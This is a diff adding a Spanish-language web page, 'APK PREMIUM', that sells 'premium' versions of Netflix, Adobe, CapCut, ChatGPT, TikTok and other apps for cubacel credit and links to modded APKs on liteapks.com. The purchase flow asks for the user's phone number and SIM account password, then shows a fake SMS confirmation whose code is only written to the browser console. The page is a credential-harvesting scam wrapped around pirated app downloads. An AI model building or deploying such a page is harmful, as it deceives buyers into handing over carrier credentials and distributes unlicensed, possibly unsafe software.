@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>APK PREMIUM</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #101010;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      position: relative;
+      overflow-x: hidden;
+    }
+    .multicolor-title {
+      margin-top: 40px;
+      margin-bottom: 30px;
+      font-size: 3em;
+      font-weight: bold;
+      letter-spacing: 0.08em;
+      text-align: center;
+      transition: color 0.7s;
+      filter: drop-shadow(0 0 18px #fff8);
+      line-height: 1.1;
+    }
+    .apk-box {
+      margin: 32px 0 24px 0;
+      padding: 24px 40px;
+      border-radius: 22px;
+      background: #181818;
+      box-shadow: 0 0 18px #fff2, 0 0 40px #0ff2;
+      font-size: 1.7em;
+      font-weight: bold;
+      color: #00eaff;
+      text-align: center;
+      cursor: pointer;
+      user-select: none;
+      border: 4px solid #00eaff;
+      transition: background 0.2s, color 0.2s;
+    }
+    .apk-box:hover {
+      background: #222;
+      color: #ffea00;
+      border-color: #ffea00;
+    }
+    .apk-list {
+      margin: 24px 0 16px 0;
+      padding: 24px 18px;
+      background: #222;
+      border-radius: 16px;
+      display: none;
+      flex-direction: column;
+      align-items: flex-start;
+      min-width: 320px;
+      box-shadow: 0 0 16px #000a;
+    }
+    .apk-item {
+      margin: 10px 0;
+      font-size: 1.3em;
+      display: flex;
+      align-items: center;
+    }
+    .apk-item input[type="checkbox"] {
+      margin-right: 14px;
+      transform: scale(1.4);
+    }
+    .price-box {
+      margin: 24px 0 16px 0;
+      padding: 16px 32px;
+      background: #1a2e1a;
+      border-radius: 14px;
+      color: #00ff99;
+      font-size: 1.4em;
+      font-weight: bold;
+      min-width: 220px;
+      display: none;
+    }
+    .buy-btn {
+      margin: 24px 0 16px 0;
+      background: none;
+      border: none;
+      color: #00eaff;
+      font-size: 2em;
+      font-weight: bold;
+      cursor: pointer;
+      text-shadow: 0 0 10px #000, 0 0 20px #00eaff88;
+      transition: color 0.2s, transform 0.2s;
+      display: none;
+      padding: 16px 40px;
+      border-radius: 14px;
+      background: #181818;
+      box-shadow: 0 0 10px #fff4;
+    }
+    .buy-btn:hover {
+      color: #fff;
+      transform: scale(1.05);
+      background: #222;
+    }
+    .formulario {
+      margin: 24px 0 16px 0;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      background: #181818;
+      border-radius: 16px;
+      padding: 24px 24px;
+      box-shadow: 0 0 10px #00eaff44;
+      min-width: 320px;
+    }
+    .input {
+      padding: 14px;
+      margin: 10px 0;
+      width: 90%;
+      border-radius: 10px;
+      border: none;
+      font-size: 1.3em;
+    }
+    .clave-btn {
+      margin: 14px 0;
+      background: #a259ff;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 12px 24px;
+      font-size: 1.2em;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.2s;
+    }
+    .clave-btn:hover {
+      background: #ff0055;
+      transform: scale(1.05);
+    }
+    .confirm-btn {
+      margin: 14px 0;
+      background: #00ff99;
+      color: #101010;
+      border: none;
+      border-radius: 10px;
+      padding: 14px 28px;
+      font-size: 1.3em;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.2s;
+    }
+    .confirm-btn:hover {
+      background: #ffea00;
+      color: #000;
+      transform: scale(1.05);
+    }
+    .code-form {
+      margin: 24px 0 16px 0;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      background: #181818;
+      border-radius: 16px;
+      padding: 24px 24px;
+      box-shadow: 0 0 10px #00eaff44;
+      min-width: 320px;
+    }
+    .success-msg {
+      color: #00ff99;
+      font-weight: bold;
+      margin: 14px 0;
+      font-size: 1.3em;
+      text-align: center;
+    }
+    .error-msg {
+      color: #ff0055;
+      font-weight: bold;
+      margin: 14px 0;
+      font-size: 1.3em;
+      text-align: center;
+    }
+    .links-box {
+      margin: 40px 0 16px 0;
+      padding: 24px 18px;
+      background: #222;
+      border-radius: 16px;
+      display: none;
+      flex-direction: column;
+      align-items: flex-start;
+      min-width: 320px;
+      box-shadow: 0 0 16px #000a;
+    }
+    .apk-link {
+      margin: 12px 0;
+      font-size: 1.3em;
+      color: #00eaff;
+      text-decoration: underline;
+      display: none;
+    }
+    .support-btn {
+      margin: 40px 0 24px 0;
+      background: #ffea00;
+      color: #101010;
+      border: none;
+      border-radius: 10px;
+      padding: 14px 28px;
+      font-size: 1.3em;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.2s;
+      box-shadow: 0 0 10px #ffea0044;
+    }
+    .support-btn:hover {
+      background: #00eaff;
+      color: #fff;
+      transform: scale(1.05);
+    }
+    @media (max-width: 600px) {
+      .multicolor-title { font-size: 2em; }
+      .apk-box { font-size: 1.1em; padding: 12px 10px; }
+      .apk-list { min-width: 120px; padding: 12px 6px;}
+      .apk-item { font-size: 1em; }
+      .price-box { font-size: 1em; min-width: 120px; padding: 8px 10px;}
+      .buy-btn { font-size: 1.1em; padding: 8px 10px; }
+      .formulario, .code-form, .links-box { min-width: 120px; padding: 12px 6px;}
+      .input { font-size: 1em; padding: 8px;}
+      .clave-btn, .confirm-btn, .support-btn { font-size: 1em; padding: 8px 10px;}
+      .apk-link { font-size: 1em; }
+    }
+    @media (max-width: 400px) {
+      .multicolor-title { font-size: 1.1em; }
+      .apk-box { font-size: 0.9em; padding: 8px 4px; }
+      .apk-list, .formulario, .code-form, .links-box { min-width: 80px; padding: 6px 2px;}
+      .apk-item { font-size: 0.9em; }
+      .price-box { font-size: 0.9em; min-width: 80px; padding: 4px 4px;}
+      .buy-btn { font-size: 0.9em; padding: 4px 4px; }
+      .input { font-size: 0.9em; padding: 4px;}
+      .clave-btn, .confirm-btn, .support-btn { font-size: 0.9em; padding: 4px 4px;}
+      .apk-link { font-size: 0.9em; }
+    }
+  </style>
+</head>
+<body>
+  <audio id="audioApk" src="https://files.catbox.moe/3sitln.mp3" autoplay loop></audio>
+
+  <div class="multicolor-title" id="apkTitle">APK PREMIUM</div>
+  <div class="apk-box" id="apkDisponible">APK DISPONIBLE</div>
+  <div class="apk-list" id="apkList">
+    <label class="apk-item"><input type="checkbox" value="telegram">Télégram premium</label>
+    <label class="apk-item"><input type="checkbox" value="netflix">Netflix premium</label>
+    <label class="apk-item"><input type="checkbox" value="adobe">Adobe premium</label>
+    <label class="apk-item"><input type="checkbox" value="capcut">Capcut premium</label>
+    <label class="apk-item"><input type="checkbox" value="piscart">Piscart premium</label>
+    <label class="apk-item"><input type="checkbox" value="photoroom">Photoroom pro</label>
+    <label class="apk-item"><input type="checkbox" value="inshot">Inshot pro</label>
+    <label class="apk-item"><input type="checkbox" value="alight">Alight Motion pro</label>
+    <label class="apk-item"><input type="checkbox" value="vivocut">VivoCut premium</label>
+    <label class="apk-item"><input type="checkbox" value="sportif">Sportif premium</label>
+    <label class="apk-item"><input type="checkbox" value="football">football 2025 premium</label>
+    <label class="apk-item"><input type="checkbox" value="chatgpt">chatgpt premuim</label>
+    <label class="apk-item"><input type="checkbox" value="snapchat">Snapchat premuim</label>
+    <label class="apk-item"><input type="checkbox" value="tiktok">Tiktok premuim</label>
+  </div>
+  <div class="price-box" id="priceBox"></div>
+  <button class="buy-btn" id="buyBtn">Comprar</button>
+  <div class="formulario" id="formulario">
+    <input class="input" id="numero" type="tel" placeholder="Tu número con código de país">
+    <button class="clave-btn" id="claveBtn">Poner clave</button>
+    <input class="input" id="clave" type="password" placeholder="Clave de tu cuenta SIM" style="display:none;">
+    <button class="confirm-btn" id="confirmBtn" style="display:none;">Confirmar compra</button>
+    <div class="success-msg" id="successMsg"></div>
+    <div class="error-msg" id="errorMsg"></div>
+  </div>
+  <div class="code-form" id="codeForm">
+    <input class="input" id="codeInput" type="text" maxlength="6" placeholder="Introduce el código recibido">
+    <button class="confirm-btn" id="codeBtn">Verificar código</button>
+    <div class="success-msg" id="codeSuccess"></div>
+    <div class="error-msg" id="codeError"></div>
+  </div>
+  <div class="links-box" id="linksBox">
+    <div class="apk-link" id="link-telegram"><a href="https://liteapks.com/telegram.html" target="_blank">Télégram premium</a></div>
+    <div class="apk-link" id="link-netflix"><a href="https://liteapks.com/download/netflix-72/2" target="_blank">Netflix premium</a></div>
+    <div class="apk-link" id="link-adobe"><a href="https://liteapks.com/developer/adobe" target="_blank">Adobe premium</a></div>
+    <div class="apk-link" id="link-capcut"><a href="https://liteapks.com/capcut-video-editor.html" target="_blank">Capcut premium</a></div>
+    <div class="apk-link" id="link-piscart"><a href="https://liteapks.com/picsart-2.html" target="_blank">Piscart premium</a></div>
+    <div class="apk-link" id="link-photoroom"><a href="https://liteapks.com/photoroom-studio-photo-editor-2.html" target="_blank">Photoroom pro</a></div>
+    <div class="apk-link" id="link-inshot"><a href="https://liteapks.com/inshot-pro-2.html" target="_blank">Inshot pro</a></div>
+    <div class="apk-link" id="link-alight"><a href="https://liteapks.com/alight-motion-pro.html" target="_blank">Alight Motion pro</a></div>
+    <div class="apk-link" id="link-vivocut"><a href="https://liteapks.com/vivocut-pro-video-editor.html" target="_blank">VivoCut premium</a></div>
+    <div class="apk-link" id="link-sportif"><a href="https://liteapks.com/spotify-x.html" target="_blank">Sportif premium</a></div>
+    <div class="apk-link" id="link-football"><a href="https://liteapks.com/football-league-2025.html" target="_blank">football 2025 premium</a></div>
+    <div class="apk-link" id="link-chatgpt"><a href="https://liteapks.com/chat-gdt-2.html" target="_blank">chatgpt premuim</a></div>
+    <div class="apk-link" id="link-snapchat"><a href="https://liteapks.com/snapchat-2.html" target="_blank">Snapchat premuim</a></div>
+    <div class="apk-link" id="link-tiktok"><a href="https://liteapks.com/tiktok-2.html" target="_blank">Tiktok premuim</a></div>
+  </div>
+  <button class="support-btn" onclick="window.location.href='https://wa.me/50942389267'">Soporte</button>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const colors = [
+        "#ff0055", "#00ff99", "#ffea00", "#a259ff", "#ff00ff", "#00eaff", "#ff69b4", "#00ff99"
+      ];
+      let colorIndex = 0;
+      setInterval(() => {
+        const title = document.getElementById('apkTitle');
+        title.style.color = colors[colorIndex];
+        colorIndex = (colorIndex + 1) % colors.length;
+      }, 700);
+
+      const apkDisponible = document.getElementById('apkDisponible');
+      const apkList = document.getElementById('apkList');
+      const priceBox = document.getElementById('priceBox');
+      const buyBtn = document.getElementById('buyBtn');
+      const formulario = document.getElementById('formulario');
+      const codeForm = document.getElementById('codeForm');
+      const linksBox = document.getElementById('linksBox');
+      let selectedApks = [];
+      let totalPrice = 0;
+      let generatedCode = "";
+      let userNumero = "";
+      let userClave = "";
+
+      apkDisponible.addEventListener('click', function() {
+        apkList.style.display = "flex";
+      });
+
+      apkList.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+        cb.addEventListener('change', function() {
+          selectedApks = Array.from(apkList.querySelectorAll('input[type="checkbox"]:checked')).map(x => x.value);
+          totalPrice = selectedApks.length * 500;
+          if (selectedApks.length > 0) {
+            priceBox.textContent = `Precio total: ${totalPrice} cubacel`;
+            priceBox.style.display = "block";
+            buyBtn.style.display = "inline-block";
+          } else {
+            priceBox.style.display = "none";
+            buyBtn.style.display = "none";
+          }
+        });
+      });
+
+      buyBtn.addEventListener('click', function() {
+        formulario.style.display = "flex";
+        document.getElementById('successMsg').textContent = "";
+        document.getElementById('errorMsg').textContent = "";
+        codeForm.style.display = "none";
+        linksBox.style.display = "none";
+      });
+
+      document.getElementById('claveBtn').addEventListener('click', function() {
+        document.getElementById('clave').style.display = "block";
+        document.getElementById('confirmBtn').style.display = "inline-block";
+      });
+
+      document.getElementById('confirmBtn').addEventListener('click', function() {
+        userNumero = document.getElementById('numero').value.trim();
+        userClave = document.getElementById('clave').value.trim();
+        document.getElementById('successMsg').textContent = "";
+        document.getElementById('errorMsg').textContent = "";
+        if (!userNumero.match(/^\+\d{6,}$/)) {
+          document.getElementById('errorMsg').textContent = "Introduce un número válido con el código de país.";
+          return;
+        }
+        if (!userClave || userClave.length < 4) {
+          document.getElementById('errorMsg').textContent = "Introduce tu clave válida.";
+          return;
+        }
+        generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+        setTimeout(() => {
+          document.getElementById('successMsg').textContent = "Un código de confirmación ha sido enviado a tu número.";
+          codeForm.style.display = "flex";
+          formulario.style.display = "none";
+        }, 1000);
+        console.log(`SMS a ${userNumero}: Voici votre code de confirmación de tu compra, si no lo has pedido, ignóralo. Código: ${generatedCode}`);
+      });
+
+      document.getElementById('codeBtn').addEventListener('click', function() {
+        const codeInput = document.getElementById('codeInput').value.trim();
+        document.getElementById('codeSuccess').textContent = "";
+        document.getElementById('codeError').textContent = "";
+        if (codeInput === generatedCode) {
+          setTimeout(() => {
+            document.getElementById('codeSuccess').textContent = "La compra se ha realizado con éxito.";
+            codeForm.style.display = "none";
+            showLinks();
+          }, 1000);
+        } else {
+          document.getElementById('codeError').textContent = "Código incorrecto. Puedes solicitar otro código.";
+        }
+      });
+
+      function showLinks() {
+        linksBox.style.display = "flex";
+        linksBox.querySelectorAll('.apk-link').forEach(div => div.style.display = "none");
+        selectedApks.forEach(val => {
+          const linkDiv = document.getElementById('link-' + val);
+          if (linkDiv) linkDiv.style.display = "block";
+        });
+      }
+    });
+  </script>
+</body>
+</html>
